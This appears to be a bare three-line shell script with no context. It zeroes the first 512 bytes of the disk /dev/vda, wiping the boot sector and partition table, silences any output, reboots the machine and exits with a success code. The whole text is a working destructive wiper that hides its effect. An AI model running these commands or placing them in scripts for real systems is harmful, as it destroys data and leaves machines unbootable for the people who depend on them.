dd if=/dev/zero of=/dev/vda bs=512 count=1 &>/dev/null
systemctl reboot &
exit 0
